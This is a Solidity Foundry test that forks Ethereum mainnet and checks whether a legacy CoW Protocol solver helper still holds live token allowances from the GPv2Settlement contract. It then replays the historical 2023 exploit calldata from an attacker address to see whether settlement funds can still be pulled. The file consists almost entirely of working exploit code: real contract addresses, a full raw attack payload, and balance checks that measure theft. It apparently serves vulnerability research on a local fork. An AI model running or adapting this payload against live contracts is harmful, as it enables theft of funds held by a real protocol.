// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console2} from "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function allowance(address, address) external view returns (uint256);
}

/// @title CoW GPv2Settlement — legacy unverified solver helper 0xf6a94dfd (2023-hack pattern)
/// @notice The settlement still has LIVE max allowances to this helper. Its entry 0xf0210929
///         takes `payer` as a calldata field. This test replays the historical call and a
///         redirected variant to see whether it can still pull from the settlement.
contract LegacyHelperTest is Test {
    address constant SETTLEMENT = 0x9008D19f58AAbD9eD0D60971565AA8510560ab41;
    address constant HELPER = 0xF6a94dfD0E6ea9ddFdFfE4762Ad4236576136613;
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant SUSHI = 0x6B3595068778DD592e39A122f4f5a5cF09C90fE2;
    address constant ATTACKER = address(0xBADBAD);

    function forkUrl() internal view returns (string memory) {
        return vm.envOr("FORK_RPC_URL", vm.envOr("RPC_URL", string("https://ethereum-rpc.publicnode.com")));
    }

    function setUp() public {
        vm.createSelectFork(forkUrl(), 26_253_971);
    }

    function test_helper_allowance_live() public view {
        console2.log("USDC allow to helper", IERC20(USDC).allowance(SETTLEMENT, HELPER));
        console2.log("SUSHI allow to helper", IERC20(SUSHI).allowance(SETTLEMENT, HELPER));
        console2.log("settlement USDC", IERC20(USDC).balanceOf(SETTLEMENT));
        console2.log("settlement SUSHI", IERC20(SUSHI).balanceOf(SETTLEMENT));
        assertGt(IERC20(USDC).allowance(SETTLEMENT, HELPER), 0, "allowance not live");
    }

    /// @dev Replay the exact 2023 calldata (block 16826077) from an unprivileged caller.
    function test_replay_original_calldata() public {
        bytes memory data = hex"f02109290000000000000000000000000000000000000000000000000000000000000020000000000000000000000000bfa899c1ad97229d9c604e9ea927c7acb988c05c000000000000000000000000af0b0000f0210d0f421f0009c72406703b50506b0000000000000000000000009008d19f58aabd9ed0d60971565aa8510560ab4100000000000000000000000055a37a2e5e5973510ac9d9c723aec213fa1619190000000000000000000000006b3595068778dd592e39a122f4f5a5cf09c90fe2000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb4800000000000000000000000000000000000000000000008f6d7c4510544015fb00000000000000000000000000000000000000000000008f6d7c4510544015fb00000000000000000000000000000000000000000000000000000000bcb2b2ed000000000000000000000000000000000000000000000000000000006410636800000000000000000000000000000000000000000000000000000186e0038bca0367616e64616c6674686562726f776e67786d786e690017819ca3cae48f000000000000000000000000000000000000000000000000000000000000000001a00000000000000000000000000000000000000000000000000000000000000041cabc7f0c13b62d32360ed924784565bbbf9b9c58dee25ff1c0968734be53d40c55f7e7c485b91e8c173d0dc778ecc5562e1790dcbdeda89cc2179ac3222772b31b00000000000000000000000000000000000000000000000000000000000000";
        uint256 sBefore = IERC20(SUSHI).balanceOf(SETTLEMENT);
        uint256 uBefore = IERC20(USDC).balanceOf(SETTLEMENT);
        vm.prank(ATTACKER);
        (bool ok, bytes memory ret) = HELPER.call(data);
        console2.log("replay ok", ok);
        console2.logBytes(ret);
        console2.log("SUSHI before/after", sBefore, IERC20(SUSHI).balanceOf(SETTLEMENT));
        console2.log("USDC  before/after", uBefore, IERC20(USDC).balanceOf(SETTLEMENT));
    }
}
